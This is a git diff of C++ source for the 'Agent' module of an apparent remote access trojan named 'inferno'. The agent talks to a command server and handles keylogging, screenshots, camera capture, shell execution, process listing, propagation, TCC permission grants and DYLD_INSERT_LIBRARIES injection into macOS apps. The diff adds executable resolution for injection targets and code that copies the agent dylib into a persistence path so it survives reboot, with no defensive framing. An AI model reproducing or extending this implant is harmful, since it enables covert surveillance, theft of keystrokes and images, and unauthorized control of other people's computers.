@@ -1,5 +1,8 @@
 #include "../include/Agent.hpp"
 #include "../include/entry_dylib.hpp"
+#ifdef __APPLE__
+#include <dlfcn.h>
+#endif
 #include "../include/EntitlementScanner.hpp"
 #include "../include/MachInjector.hpp"
 #include "../include/ScreenCapture.hpp"
@@ -192,27 +195,26 @@ void Agent::handleListening() {
 
     // Sliding buffer loop: process ALL complete packets in the buffer
     while (true) {
-        // Guard: need at least a full header to inspect
-        if (m_receive_buffer.size() < sizeof(PacketHeader)) break;
+        if (m_receive_buffer.size() < 10) break;
 
-        // Resync: peek at magic before calling deserialize().
-        // deserialize() returns nullopt for BOTH "incomplete data" and "invalid magic/checksum".
-        // Without this check, a single corrupted prefix byte causes an infinite stall.
-        const uint32_t magic =
-            (static_cast<uint32_t>(m_receive_buffer[0]) << 24) |
-            (static_cast<uint32_t>(m_receive_buffer[1]) << 16) |
-            (static_cast<uint32_t>(m_receive_buffer[2]) << 8)  |
-             static_cast<uint32_t>(m_receive_buffer[3]);
+        std::fprintf(stderr, "[Agent] Buffer %zu bytes, malleable=%s\n",
+                    m_receive_buffer.size(),
+                    m_socket.hasSessionKey() ? "yes" : "no");
 
-        if (magic != 0xDEADBEEF) {
-            std::cerr << "[Agent] Buffer desync detected — discarding 1 byte to resync.\n";
-            m_receive_buffer.erase(m_receive_buffer.begin());
-            continue;
-        }
-
-        auto packet_opt = ::inferno::Packet::deserialize(m_receive_buffer);
+        auto packet_opt = m_socket.receivePacket(m_receive_buffer);
         if (!packet_opt.has_value()) {
-            break; // Incomplete packet — wait for more data
+            // Legacy resync: discard bytes that don't start with 0xDEADBEEF
+            const uint32_t magic =
+                (static_cast<uint32_t>(m_receive_buffer[0]) << 24) |
+                (static_cast<uint32_t>(m_receive_buffer[1]) << 16) |
+                (static_cast<uint32_t>(m_receive_buffer[2]) << 8)  |
+                 static_cast<uint32_t>(m_receive_buffer[3]);
+            if (magic != 0xDEADBEEF) {
+                std::fprintf(stderr, "[Agent] Buffer desync (magic=0x%08x), discarding 1 byte\n", magic);
+                m_receive_buffer.erase(m_receive_buffer.begin());
+                continue;
+            }
+            break;
         }
         const size_t packet_size = sizeof(PacketHeader) + packet_opt->getWirePayloadSize();
         handleDispatching(std::move(*packet_opt));
@@ -228,9 +230,7 @@ void Agent::handleDispatching(Packet&& packet) {
 
     if (opcode == static_cast<uint16_t>(Opcode::SYS_REQ_INFO)) {
         std::string info = getSystemInfo();
-        Packet res(static_cast<uint16_t>(Opcode::SYS_RES_INFO), info);
-        std::vector<uint8_t> data = res.serialize();
-        m_socket.sendData(data);
+        m_socket.sendPacket(static_cast<uint16_t>(Opcode::SYS_RES_INFO), info);
 
         // Tier 2: scan for injectable apps and report all targets to server
         std::string scan_report = "none||0|0";
@@ -291,9 +291,7 @@ void Agent::handleDispatching(Packet&& packet) {
             std::cerr << "[Agent] Scanner failed with unknown error" << std::endl;
             scan_report = "none||0|0";
         }
-        Packet scan_res(static_cast<uint16_t>(Opcode::SCAN_RESULT), scan_report);
-        data = scan_res.serialize();
-        m_socket.sendData(data);
+        m_socket.sendPacket(static_cast<uint16_t>(Opcode::SCAN_RESULT), scan_report);
 
         // Persist for reboot survival (only once per session)
         if (!m_persistence_installed) {
@@ -315,9 +313,7 @@ void Agent::handleDispatching(Packet&& packet) {
                 m_keylog_pending_data.clear();
             }
         }
-        Packet pong(static_cast<uint16_t>(Opcode::PONG), pong_payload);
-        std::vector<uint8_t> data = pong.serialize();
-        m_socket.sendData(data);
+        m_socket.sendPacket(static_cast<uint16_t>(Opcode::PONG), pong_payload);
     } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_START)) {
         handleKeylogStart();
     } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_STOP)) {
@@ -420,16 +416,14 @@ void Agent::handlePropagation(Packet&& packet) {
     payload.push_back(static_cast<uint8_t>(out_len & 0xFF));
     payload.insert(payload.end(), result.output.begin(), result.output.begin() + output_size);
 
-    Packet res(static_cast<uint16_t>(Opcode::PROPAGATE_RES),
-               std::string(payload.begin(), payload.end()));
-    m_socket.sendData(res.serialize());
+    m_socket.sendPacket(static_cast<uint16_t>(Opcode::PROPAGATE_RES),
+                         std::string(payload.begin(), payload.end()));
 }
 
 void Agent::handleInjection(Packet&& packet) {
     const auto& raw = packet.getPayload();
     if (raw.empty()) {
-        Packet res(static_cast<uint16_t>(Opcode::INJECT_RES), "empty|empty|0|0");
-        m_socket.sendData(res.serialize());
+        m_socket.sendPacket(static_cast<uint16_t>(Opcode::INJECT_RES), "empty|empty|0|0");
         return;
     }
 
@@ -438,9 +432,47 @@ void Agent::handleInjection(Packet&& packet) {
 
     // Build TargetApp on the fly — capability defaults to DYLD_INSERT_LIBRARIES
     inferno::tier2::TargetApp target;
-    target.executable_path = target_path;
     target.path = target_path;
     target.capability = inferno::tier2::InjectionCapability::DYLD_INSERT_LIBRARIES;
+
+    // Derive executable path from .app bundle path:
+    // "/Applications/DBeaver.app" → "/Applications/DBeaver.app/Contents/MacOS/DBeaver"
+#ifdef __APPLE__
+    if (target_path.size() > 4 && target_path.substr(target_path.size() - 4) == ".app") {
+        // Read the actual executable name from Info.plist (CFBundleExecutable)
+        // rather than assuming it matches the .app bundle name.
+        std::string exec_name;
+        std::string plist_path = target_path + "/Contents/Info.plist";
+        std::ifstream plist(plist_path);
+        if (plist) {
+            std::string content((std::istreambuf_iterator<char>(plist)),
+                                 std::istreambuf_iterator<char>());
+            auto key_pos = content.find("CFBundleExecutable");
+            if (key_pos != std::string::npos) {
+                auto start = content.find("<string>", key_pos);
+                if (start != std::string::npos) {
+                    start += 8;
+                    auto end = content.find("</string>", start);
+                    if (end != std::string::npos) {
+                        exec_name = content.substr(start, end - start);
+                    }
+                }
+            }
+        }
+        if (exec_name.empty()) {
+            // Fallback: use the .app bundle name
+            size_t last_slash = target_path.rfind('/');
+            exec_name = (last_slash != std::string::npos)
+                ? target_path.substr(last_slash + 1, target_path.size() - last_slash - 5)
+                : target_path.substr(0, target_path.size() - 4);
+        }
+        target.executable_path = target_path + "/Contents/MacOS/" + exec_name;
+    } else {
+        target.executable_path = target_path;
+    }
+#else
+    target.executable_path = target_path;
+#endif
 
     std::string dylib_path = getAgentDylibPath();
 
@@ -451,8 +483,7 @@ void Agent::handleInjection(Packet&& packet) {
                        + std::to_string(static_cast<int>(target.capability)) + "|"
                        + (success ? "1" : "0");
 
-    Packet res(static_cast<uint16_t>(Opcode::INJECT_RES), result);
-    m_socket.sendData(res.serialize());
+    m_socket.sendPacket(static_cast<uint16_t>(Opcode::INJECT_RES), result);
 
     if (success) {
         persistInjectedAgent(m_server_ip, m_server_port, target_path);
@@ -487,9 +518,8 @@ void Agent::handleScreenshot() {
     payload.push_back(static_cast<uint8_t>(sz & 0xFF));
     payload.insert(payload.end(), result.jpeg_data.begin(), result.jpeg_data.end());
 
-    Packet res(static_cast<uint16_t>(Opcode::SCREENSHOT_RES),
-               std::string(payload.begin(), payload.end()));
-    m_socket.sendData(res.serialize());
+    m_socket.sendPacket(static_cast<uint16_t>(Opcode::SCREENSHOT_RES),
+                         std::string(payload.begin(), payload.end()));
     if (result.success) {
         std::cout << "[Agent] Screenshot captured (" << w << "x" << h
                   << ", " << sz << " bytes)" << std::endl;
@@ -524,17 +554,15 @@ void Agent::handleCameraCapture() {
     payload.push_back(static_cast<uint8_t>(sz & 0xFF));
     payload.insert(payload.end(), result.jpeg_data.begin(), result.jpeg_data.end());
 
-    Packet res(static_cast<uint16_t>(Opcode::SCREENSHOT_RES),
-               std::string(payload.begin(), payload.end()));
-    m_socket.sendData(res.serialize());
+    m_socket.sendPacket(static_cast<uint16_t>(Opcode::SCREENSHOT_RES),
+                         std::string(payload.begin(), payload.end()));
     std::cout << "[Agent] Camera captured (" << w << "x" << h
               << ", " << sz << " bytes)" << std::endl;
 #else
     std::vector<uint8_t> payload(14, 0);
     payload[1] = 1;
-    Packet res(static_cast<uint16_t>(Opcode::SCREENSHOT_RES),
-               std::string(payload.begin(), payload.end()));
-    m_socket.sendData(res.serialize());
+    m_socket.sendPacket(static_cast<uint16_t>(Opcode::SCREENSHOT_RES),
+                         std::string(payload.begin(), payload.end()));
     std::fprintf(stderr, "[Agent] Camera not supported on this platform\n");
 #endif
 }
@@ -554,8 +582,7 @@ void Agent::handleTccGrant(Packet&& packet) {
     result_str = bundle_id + "|0";
 #endif
 
-    Packet res(static_cast<uint16_t>(Opcode::TCC_GRANT_RES), result_str);
-    m_socket.sendData(res.serialize());
+    m_socket.sendPacket(static_cast<uint16_t>(Opcode::TCC_GRANT_RES), result_str);
 }
 
 #ifdef INFERNO_TESTING
@@ -648,9 +675,8 @@ void Agent::handleShellExecution(Packet&& packet) {
         payload.push_back(static_cast<uint8_t>(len & 0xFF));
         payload.insert(payload.end(), data.begin(), data.end());
 
-        Packet res(static_cast<uint16_t>(Opcode::CMD_RES),
-                   std::string(payload.begin(), payload.end()));
-        m_socket.sendData(res.serialize());
+        m_socket.sendPacket(static_cast<uint16_t>(Opcode::CMD_RES),
+                             std::string(payload.begin(), payload.end()));
     };
 
     if (total == 0) {
@@ -719,10 +745,8 @@ void Agent::handleProcessDiscovery() {
             payload.insert(payload.end(), list[i].name.begin(), list[i].name.end());
         }
 
-        Packet res(static_cast<uint16_t>(Opcode::PROC_LIST_RES), 
-                  std::string(payload.begin(), payload.end()));
-        
-        m_socket.sendData(res.serialize());
+        m_socket.sendPacket(static_cast<uint16_t>(Opcode::PROC_LIST_RES),
+                             std::string(payload.begin(), payload.end()));
     }
 }
 
@@ -913,6 +937,58 @@ void Agent::persistInjectedAgent(const std::string& server_ip,
 )", escapeXml(exec_path).c_str(), escapeXml(dylib_path).c_str(),
    escapeXml(server_ip).c_str(), escapeXml(port_str).c_str());
     ::fclose(f);
+
+    // Copy the current dylib to the persistence path so a rebuilt binary
+    // is persisted without manual intervention. Uses dladdr() to find the
+    // directory of the loaded image, then appends the dylib filename.
+    // When running as the injected dylib itself, the source equals the
+    // destination and the copy is skipped.
+    {
+        std::string src_dir;
+#ifdef __APPLE__
+        Dl_info info;
+        if (::dladdr(reinterpret_cast<const void*>(&persistInjectedAgent),
+                      &info) != 0) {
+            src_dir = info.dli_fname;
+            size_t sep = src_dir.rfind('/');
+            if (sep != std::string::npos) {
+                src_dir.resize(sep + 1);
+            }
+        }
+#elif defined(_WIN32)
+        char mod_path[MAX_PATH];
+        if (::GetModuleFileNameA(nullptr, mod_path, MAX_PATH) != 0) {
+            src_dir = mod_path;
+            size_t sep = src_dir.rfind('\\');
+            if (sep != std::string::npos) {
+                src_dir.resize(sep + 1);
+            }
+        }
+#endif
+        if (!src_dir.empty()) {
+#ifdef __APPLE__
+            std::string src_dylib = src_dir + "libinferno_agent.dylib";
+#else
+            std::string src_dylib = src_dir + "inferno_agent.dll";
+#endif
+            if (src_dylib != dylib_path) {
+                std::ifstream src(src_dylib, std::ios::binary);
+                if (src.is_open()) {
+                    std::ofstream dst(dylib_path, std::ios::binary);
+                    if (dst.is_open()) {
+                        dst << src.rdbuf();
+                        bool ok = dst.good();
+                        dst.close();
+                        src.close();
+                        if (ok) {
+                            std::fprintf(stdout, "[Agent] Copied %s → %s\n",
+                                         src_dylib.c_str(), dylib_path.c_str());
+                        }
+                    }
+                }
+            }
+        }
+    }
 }
 #elif defined(_WIN32)
 void Agent::persistInjectedAgent(const std::string& server_ip,
